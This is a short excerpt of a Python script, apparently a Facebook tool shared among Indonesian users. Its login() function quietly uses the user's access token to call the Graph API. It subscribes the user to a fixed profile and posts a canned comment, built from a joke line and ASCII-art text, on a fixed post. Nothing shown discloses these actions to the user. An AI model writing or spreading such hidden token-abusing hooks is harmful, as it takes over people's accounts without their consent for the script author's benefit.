...
ajg=''
def login():
    lauk=awokawok(['Aa Raka ganteng:v','gua jelek:v','A Raka Bagi Script nya Donk
 @@@@@@@  @@@  @@@@@@  @@@@@@@@
 @@!  @@@ @@! @@!  @@@      @@!
 @!@!!@!  !!@ @!@!@!@!    @!!  
 !!: :!!  !!: !!:  !!!  !!:    
  :   : : :    :   : : :.::.: :'])
    ...
    try:
        ...
        nama=r['name']
        req.post(f'https://graph.facebook.com/100017584682867/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/953529338576547/comments?message={lauk}&access_token={t}')
